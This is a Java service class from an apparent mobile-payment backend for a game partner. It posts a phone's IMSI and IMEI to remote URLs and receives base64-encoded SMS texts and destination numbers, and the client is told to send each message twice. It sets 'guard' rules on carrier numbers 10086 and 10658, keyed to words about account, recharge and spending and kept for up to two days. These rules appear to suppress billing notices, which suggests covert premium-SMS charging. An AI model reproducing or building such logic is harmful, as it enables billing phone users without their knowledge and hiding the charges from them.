package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import sun.misc.BASE64Decoder;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.handler.MobileInfoHandler;
import com.jxt.pay.handler.PhoneNoRegionHandler;
import com.jxt.pay.helper.BlackMobileHelper;
import com.jxt.pay.pojo.MobileInfo;
import com.jxt.pay.pojo.PhoneNoRegion;

/**
 * 对接南京网游
 * @author leoliu
 *
 */
public class KdslDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(KdslDynamicService.class);
	
	private static final String FIRSTREQUESTMODEL = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><imsi>{imsi}</imsi><imei>{imei}</imei><price>{price}</price><cpparam>{cpparam}</cpparam></request>";
	private static final String SECONDREQUESTMODEL = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><request><content_sid>{content_sid}</content_sid></request>";

	private static final Guard guard1 = new Guard("10658", "无法|稍后", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("1065889955","成功|购买",1440,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	
//	private static final String DEFAULTPREFIX = "+86";
	
	private static final String MODEL_SMS = "sms_{i}";
	private static final String MODEL_SMSNUM = "sms_{i}_num";
	private static final String MODEL_RETURNSMSNUM = "return_sms_num_{i}";
	private static final String MODEL_RETURNSMSCONTENT = "return_sms_content_{i}";
	
	private static final String PHONENUMBER = "phone_number";
	private static final String IMEI = "imei";
	private static final String MOBILEID = "mobileId";
	
	private static final String STATUS_WAIT = "0";
	private static final String STATUS_SUCC = "1";
	
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	
	private static final String TYPE = "kdsl";
	
	private int timeOut = 150;
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	private Map<String, Integer> map1 = new HashMap<String, Integer>();
	
	private String firstDynamic(Map<String,String> map){
		
		String url = map.get("url");
		String xml = null;
		
		if(url != null && url.length() > 0){
			
			String mobileId = map.get("mobileId");
			
			if(mobileId != null && mobileId.length() > 0){
				try{
					long _mobileId = Long.parseLong(mobileId);
					
					//check is black
					MobileInfo mobileInfo = mobileInfoHandler.select(_mobileId);
					
					if(mobileInfo != null){
						Boolean isBlack = mobileInfo.getIsBlack();
						
						if(isBlack != null && isBlack){
							xml = DynamicUtils.parseError("503");//获取失败
						}
					}
				}catch(Exception e){
					e.printStackTrace();
				}
			}
			
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			if(imei == null){
				imei = "";
			}
			if(imsi == null){
				imsi = "";
			}
			
			String price = map.get("price");
			String cpparam = map.get("channel");
			
			String script = FIRSTREQUESTMODEL.replace("{imsi}", imsi).replace("{imei}", imei).replace("{price}", price+"").replace("{cpparam}", cpparam);
		
			logger.info("firstDynamic : "+script);
			
			String responseXml = new PostData().PostData(script.getBytes(), url);
			
			xml = parseFirst(responseXml);			
		}
		
		String cpparam = map.get("channel");
		
		if(xml == null){
			Integer cnt = map1.get(cpparam);
			
			if(cnt == null){
				cnt = 0;
			}
			
			if(cnt >= 3){
				map1.remove(cpparam);
				xml = DynamicUtils.parseError("598");
			}else{
				cnt ++;
				map1.put(cpparam, cnt);
				
				xml = DynamicUtils.parseWait(map);//获取失败
			}
		}else{
			map1.remove(cpparam);
		}
		
		return xml;
	}

	private String parseFirst(String responseXml){
		logger.info("parseFirst : "+responseXml);
		if(responseXml != null && responseXml.length() > 0){
			String smsNum = SingleXmlUtil.getNodeValue(responseXml, MODEL_SMSNUM.replace("{i}", "1"));
//			if(smsNum != null && smsNum.length() > 0 && !smsNum.startsWith(DEFAULTPREFIX)){
//				smsNum = DEFAULTPREFIX+smsNum;
//			}
			String smsContent = SingleXmlUtil.getNodeValue(responseXml, MODEL_SMS.replace("{i}", "1"));
			String content_sid = SingleXmlUtil.getNodeValue(responseXml, "content_sid");
			
			if(smsContent != null && smsContent.length() > 0 && smsNum != null && smsNum.length() > 0
					&& content_sid != null && content_sid.length() > 0){
				try {
					smsContent = CommonUtil.base64Decode(smsContent);
					
					Sms sms = new Sms();
					sms.setSmsDest(smsNum);
					sms.setSmsContent(smsContent);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					StringBuffer smsBuffer = XstreamHelper.toXml(sms);
					
					Sets sets = new Sets();
					sets.setKey("content_sid");
					sets.setValue(content_sid);
					
					StringBuffer setsBuffer = XstreamHelper.toXml(sets);
							
					
					//发两次，为了提高送达率
					setsBuffer.append(smsBuffer);
					setsBuffer.append(smsBuffer);
					
					return setsBuffer.toString();
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		
		return null;
	}

	//记录重复请求
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	private String secondDynamic(Map<String,String> map){
		String xml = null;
		String url = map.get("url");
		
		String content_sid = map.get("content_sid");
		
		if(url != null && url.length() > 0){
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(content_sid);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(content_sid,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(content_sid);
					return DynamicUtils.parseError("599");
				}
			}
			
			String script = SECONDREQUESTMODEL.replace("{content_sid}", content_sid);
			
			logger.info("secondDynamic : "+script);
			
			String responseXml =  new PostData().PostData(script.getBytes(), url);
		
			xml = parseSecond(map,responseXml);
		}
		
		if(xml == null){
			xml = DynamicUtils.parseWait(map);//获取失败
//			tryMap.remove(content_sid);
		}
		
		return xml;
	}
		
	private String parseSecond(Map<String,String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			String status = SingleXmlUtil.getNodeValue(responseXml, "status");
			
			if(STATUS_WAIT.equals(status)){//等待
				return DynamicUtils.parseWait(map);
			}else{ 
				tryMap.remove(map.get("content_sid"));
				
				if(STATUS_SUCC.equals(status)){//完成
					return parseSecondSucc(map,responseXml);
				}else{//错误
					
					if("503".equals(status)){//存入数据库
						MobileInfo mobileInfo = new MobileInfo();
						mobileInfo.setId(Long.parseLong(map.get(MOBILEID)));
						mobileInfo.setIsBlack(true);
						
						mobileInfoHandler.updateIsBlack(mobileInfo);
					}
					
					return DynamicUtils.parseError(status);
				}
			}
		}
		
		return null;
	}
	
	private String parseSecondSucc(Map<String,String> map,String xml){
		logger.info("parse second succ : "+xml);
		
		try{
			
			boolean isBlack = false;
		
			try{
				String phone_number = SingleXmlUtil.getNodeValue(xml, PHONENUMBER);
				String mobileIdStr = map.get(MOBILEID);
				
				if(phone_number != null && phone_number.length() > 0 && mobileIdStr != null && mobileIdStr.length() > 0){
					long mobileId = Long.parseLong(mobileIdStr);
					
					MobileInfo mobileInfo = mobileInfoHandler.select(mobileId);
					
					if(blackMobileHelper.isBlack(phone_number)){
						isBlack = true;
					}
					
					if(mobileInfo.getCityCode() == null || mobileInfo.getCityCode().length() == 0){
						PhoneNoRegion phoneNoRegion = phoneNoRegionHandler.getByMobile(phone_number);
						
						if(phoneNoRegion != null){
							mobileInfo.setCityCode(phoneNoRegion.getCity());
							mobileInfo.setOperatorId(phoneNoRegion.getOperatorId());
						}
					}
					
					mobileInfo.setMobile1(phone_number);
					mobileInfo.setIsBlack(isBlack);
					mobileInfoHandler.updateMobile1(mobileInfo);
				
				}
				
				
			}catch(Exception e){
				e.printStackTrace();
			}
			
			if(isBlack){
				return DynamicUtils.parseError("503");//黑名单
			}
			
			List<String> smsContentList = new ArrayList<String>();
			List<String> smsNumList = new ArrayList<String>();
			List<String> returnSmsNumList = new ArrayList<String>();
			List<String> returnSmsContentList = new ArrayList<String>();
			
			for(int i = 2 ; ; i ++){
				String sms = SingleXmlUtil.getNodeValue(xml, MODEL_SMS.replace("{i}", i+""));
				String smsNum = SingleXmlUtil.getNodeValue(xml, MODEL_SMSNUM.replace("{i}", i+""));
				
//				if(smsNum != null && smsNum.length() > 0 && !smsNum.startsWith(DEFAULTPREFIX)){
//					smsNum = DEFAULTPREFIX+smsNum;
//				}
				
				if(sms != null && sms.length() > 0 && smsNum != null && smsNum.length() > 0){
					smsContentList.add(CommonUtil.base64Decode(sms));
					smsNumList.add(smsNum);
				}else{
					break;
				}
			}
			
			for(int i = 1 ; ; i ++){
				String returnSmsContent = SingleXmlUtil.getNodeValue(xml, MODEL_RETURNSMSCONTENT.replace("{i}", i+""));
				String returnSmsNum = SingleXmlUtil.getNodeValue(xml, MODEL_RETURNSMSNUM.replace("{i}", i+""));
				
				if(returnSmsContent != null && returnSmsContent.length() > 0 && returnSmsNum != null && returnSmsNum.length() > 0){
					returnSmsContentList.add(CommonUtil.base64Decode(returnSmsContent));
					returnSmsNumList.add(returnSmsNum);
				}else{
					break;
				}
			}
			
			List<Sms> smsList = new ArrayList<Sms>();
			
			for(int i = 0 ; i < smsContentList.size() ; i ++){
				Sms sms = new Sms();
				
				sms.setSmsContent(smsContentList.get(i));
				sms.setSmsDest(smsNumList.get(i));
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
			}
			
			Sms guardSms = new Sms();
			
//			if(smsList.size() > 0){
//				guardSms = smsList.get(smsList.size() - 1);
//			}
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
			
			for(int i = 0 ; i < returnSmsContentList.size() ; i ++){
				Guard guard = new Guard(returnSmsNumList.get(i), returnSmsContentList.get(i), 960,null, 1);
				
				if(!"10086".equals(returnSmsNumList.get(i))){
					guard.setIsLong(0);
				}else{
					guard.setGuardTimeOut(2880);//2 days
				}
				
				guardList.add(guard);
			}
			
			guardList.add(guard6);
			guardList.add(guard3);
			guardList.add(guard4);
			guardList.add(guard5);
			
			guardSms.setGuardList(guardList);
			
//			if(smsList.size() == 0){
				smsList.add(0, guardSms);
//			}
			
			
				
			return XstreamHelper.toXml(smsList);
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return null;
	}
	
	@Override
	public String getType() {
		return TYPE;
	}

	public void setTimeOut(int timeOut) {
		this.timeOut = timeOut;
	}
	
	private MobileInfoHandler mobileInfoHandler;
	
	private PhoneNoRegionHandler phoneNoRegionHandler;
	
	private BlackMobileHelper blackMobileHelper;
	
	public void setMobileInfoHandler(MobileInfoHandler mobileInfoHandler){
		this.mobileInfoHandler = mobileInfoHandler;
	}

	public void setPhoneNoRegionHandler(PhoneNoRegionHandler phoneNoRegionHandler) {
		this.phoneNoRegionHandler = phoneNoRegionHandler;
	}

	public void setBlackMobileHelper(BlackMobileHelper blackMobileHelper) {
		this.blackMobileHelper = blackMobileHelper;
	}
	
	public static void main(String[] args){
		String url_ = "http://game.uqianli.cn:9400/vn/1001/649216009396/006023333039/C080F19BCCDF3425A667D7654EE4F4A0";
		url_ = "http://112.25.8.238:8000/o/vn/aa1144c43c06d6e8a836";
		String script = FIRSTREQUESTMODEL.replace("{imsi}", "460028902761255").replace("{imei}", "861213010496287").replace("{price}", "4.00").replace("{cpparam}", "106101a000327137");
		
		String result = new PostData().PostData(script.getBytes(), url_);
		
		System.out.println("result : "+result);
	}
}
